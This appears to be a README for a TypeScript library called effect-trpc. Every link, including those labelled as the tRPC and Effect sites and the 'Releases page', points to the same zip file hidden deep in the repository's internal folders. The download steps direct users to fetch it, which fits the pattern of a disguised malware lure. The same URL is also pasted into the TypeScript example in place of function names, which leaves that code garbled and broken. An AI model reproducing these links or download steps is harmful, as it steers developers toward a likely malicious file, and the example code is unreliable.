## 🎉 Introduction

Welcome to **effect-trpc**! This tool helps you create type-safe procedures easily. It combines the power of [tRPC](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip) with [Effect](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip). With it, you can write efficient code while enjoying full service injection and automatic tracing.

## 🚀 Features

- **Easy Procedure Creation**: Write procedures using simple `yield*` syntax, making your code clean and understandable.
- **Safe Service Injection**: Provide services to your procedures with safety. The type system ensures everything works as expected.
- **Automatic Tracing**: Get insights into your procedures effortlessly. Each one includes error tracking and detailed status information.
- **Compatibility**: Mix Effect procedures with standard tRPC procedures. This flexibility helps you build robust applications.
- **Nested Router Support**: Organize your code better with nested routers. They keep track of all your procedures with proper naming.
- **Error Reporting**: If something goes wrong, you'll see detailed stack traces, making fixing issues straightforward.

## 📥 Download & Install

To get started, visit the [Releases page](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip) to download the latest version. Here’s how to install it on your system:

1. Go to the [Releases page](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip).
2. Find the latest version of effect-trpc.
3. Click to download the relevant file for your system.

## 🛠️ Installation Steps

Once you have downloaded the tool, follow these simple steps to set it up:

1. Open your command line interface. This could be Terminal on Mac, Command Prompt, or PowerShell on Windows.
2. Run the following command to install the necessary packages:

   ```bash
   bun add effect-trpc effect @trpc/server @trpc/client
   ```

3. Wait for the installation to complete. You will see messages confirming the successful installation of each package.

## 🎈 Quick Start

Now that you have everything installed, it's time to create your first procedure. Use the code below to get started:

```typescript
import { initTRPC } from "@trpc/server"
```

This import statement sets up `tRPC` with the necessary tools you need to begin. 

### 👩‍💻 Writing Your First Procedure

You can now define a simple procedure. Below is a starter example: 

```typescript
const t = https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip();

https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip('https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip', {
  input: https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip(),
  resolve({ input }) {
    // Add your logic here 
    return getUserById(input);
  }
});
```

This code demonstrates how to create a procedure to get a user by ID. It uses a string as input and returns user information.

## 📋 Troubleshooting

If you encounter any issues, here are some common questions and answers:

- **What if the installation fails?**  
  Check your internet connection. Try running the installation command again. If it still fails, consult the issues on the GitHub page.

- **Can I use this with existing projects?**  
  Yes, effect-trpc integrates smoothly with your existing setup. Just follow the installation steps and add your new procedures as needed.
